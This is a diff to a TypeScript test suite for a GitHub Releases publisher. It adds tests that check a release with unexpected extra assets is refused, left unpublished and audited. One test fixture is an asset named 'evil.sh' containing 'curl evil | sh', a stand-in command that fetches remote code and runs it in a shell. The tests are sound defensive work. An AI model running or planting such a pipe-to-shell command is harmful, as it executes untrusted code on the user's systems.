@@ -277,7 +277,7 @@ async function run(artifacts = ["web-1.0.0.tgz", "cli-linux", "cli-darwin"], tag
   const published =
     (
       JSON.parse(row.result ?? "{}") as {
-        published?: { target: string; state: string; reason?: string }[];
+        published?: { target: string; state: string; reason?: string; detail?: string }[];
       }
     ).published ?? [];
   return { row, published };
@@ -552,6 +552,46 @@ describe("GitHub Releases: draft, upload, verify, then publish", () => {
     ]);
     expect(ghCalls().filter((r) => r.method === "DELETE")).toHaveLength(1);
     expect(gh.release!.draft).toBe(false);
+  });
+
+  test("an asset the job attached on top is never published: the draft is left and the extra is audited", async () => {
+    declare("release", GH);
+    gh.release = {
+      id: 7,
+      draft: true,
+      assets: new Map([
+        [1, { name: "cli-linux", bytes: new TextEncoder().encode("linux binary") }],
+        [2, { name: "evil.sh", bytes: new TextEncoder().encode("curl evil | sh") }],
+      ]),
+    };
+    const { published } = await run();
+    expect(published[0]).toMatchObject({ state: "refused", reason: "unexpected_assets" });
+    expect(published[0]!.detail).toContain("evil.sh");
+    expect(ghCalls().some((r) => r.method === "PATCH")).toBe(false);
+    expect(gh.release!.draft).toBe(true);
+    expect(gh.release!.assets.has(2)).toBe(true);
+    const row = (await audits()).find(
+      (r) => r.outcome === "publish:release:refused:unexpected_assets",
+    );
+    expect(row).toBeDefined();
+    expect(row!.input).toContain("evil.sh");
+  });
+
+  test("a published release with an extra asset is not the release that was asked for", async () => {
+    declare("release", { ...GH, provenanceAsset: null });
+    gh.release = {
+      id: 7,
+      draft: false,
+      assets: new Map([
+        [1, { name: "cli-linux", bytes: new TextEncoder().encode("linux binary") }],
+        [2, { name: "cli-darwin", bytes: new TextEncoder().encode("darwin binary") }],
+        [3, { name: "extra.bin", bytes: new TextEncoder().encode("x") }],
+      ]),
+    };
+    const { published } = await run();
+    expect(published[0]).toMatchObject({ state: "refused", reason: "republish_mismatch" });
+    expect(published[0]!.detail).toContain("extra.bin unexpected");
+    expect(ghCalls().every((r) => r.method === "GET")).toBe(true);
   });
 
   test("if GitHub does not hold what was uploaded, the draft is never published", async () => {
